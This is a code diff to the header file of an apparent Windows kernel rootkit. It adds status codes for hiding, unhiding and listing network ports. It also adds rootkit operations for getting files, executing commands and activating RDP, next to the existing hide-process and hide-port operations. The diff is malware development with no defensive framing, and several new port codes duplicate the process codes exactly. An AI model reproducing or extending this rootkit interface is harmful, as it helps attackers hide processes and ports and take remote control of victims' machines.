@@ -26,10 +26,14 @@ REQUIRED DEFINITIONS:
 #define UNHIDE_FILEFOLDER ((NTSTATUS)0x00000121L)  // Temporary success for un-hiding file/folder
 #define HIDE_FILEFOLDER  ((NTSTATUS)0x40000028L)  // Temporary success for hiding file/folder
 #define SHOWHIDDEN_FILEFOLDER ((NTSTATUS)0x00000125L)  // Temporary success for showing list
+
 #define UNHIDE_PROCESS ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding process
 #define HIDE_PROCESS ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding process
 #define SHOWHIDDEN_PROCESS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden processes
 
+#define UNHIDE_PORT ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding ports
+#define HIDE_PORT ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding ports
+#define SHOWHIDDEN_PORTS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden ports
 
 #define TIMER_TOLERABLE_DELAY_BITS      6
 #define TIMER_EXPIRED_INDEX_BITS        6
@@ -718,7 +722,7 @@ typedef enum _ROOTKIT_STATUS {
 }ROOTKIT_STATUS, * PROOTKIT_STATUS;
 
 
-// special request constants -
+// special request constants:
 typedef enum _ROOTKIT_OPERATION {
 	RKOP_WRITE = 0xB000006F,
 	RKOP_READ = 0xB000007F,
@@ -729,8 +733,12 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_HIDEPROC = 0xB00000CF,
 	RKOP_HIDEPORT = 0xB00000DF,
 
-	RKOP_NOOPERATION = 0xB00000EF,
-	RKOP_TERMINATE = 0xB00000FF,
+	RKOP_GETFILE = 0xB00000EF,
+	RKOP_EXECOMMAND = 0xB00000FF,
+	RKOP_ACTIVATERDP = 0xB0000100,
+
+	RKOP_NOOPERATION = 0xB0000101,
+	RKOP_TERMINATE = 0xB0000102,
 }ROOTKIT_OPERATION, * PROOTKIT_OPERATION;
 
 
